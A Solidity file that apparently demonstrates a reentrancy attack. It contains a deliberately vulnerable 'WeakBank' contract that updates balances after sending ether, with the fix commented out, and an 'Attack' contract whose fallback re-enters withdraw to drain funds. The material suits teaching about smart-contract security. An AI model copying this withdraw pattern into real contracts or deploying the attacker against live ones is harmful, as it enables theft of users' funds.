// SPDX-License-Identifier: MIT

pragma solidity 0.7.5;


contract WeakBank {
    event balanceUpdate(string indexed _txType, address indexed _owner, uint _amount);
    mapping(address => uint) public balance;

    function getContractBalance() external view returns(uint){
        return address(this).balance;
    }
    
    function getBalance() external view returns(uint){
        return balance[msg.sender];
    }

    function deposit() external payable {
        balance[msg.sender] += msg.value;
        emit balanceUpdate("Deposit", msg.sender, balance[msg.sender]);
    }

    function withdraw(uint _amount) external {
        require(balance[msg.sender] >= _amount, "Insufficient balance");
        //balance[msg.sender] -= _amount;   //check effect interaction
        (bool success, ) = payable(msg.sender).call{value: _amount}("");
        require(success, "Transfer unsuccessful");
        balance[msg.sender] -= _amount;     //check effect interaction
        emit balanceUpdate("Withdraw", msg.sender, balance[msg.sender]);
    }
}

contract Attack{
    WeakBank bank;
    uint i;
    uint sentAmount;

    constructor(address _address) {
        bank = WeakBank(_address);
    }

    function getContractBalance() external view returns(uint){
        return address(this).balance;
    }

    receive() external payable{
        if(i<3){
            i++;
            bank.withdraw(sentAmount);
        }
    }

    function deposit() payable external{
        sentAmount = msg.value;
        bank.deposit{value: msg.value}();
    }

    function startAttack() external {
        bank.withdraw(sentAmount);
    }
}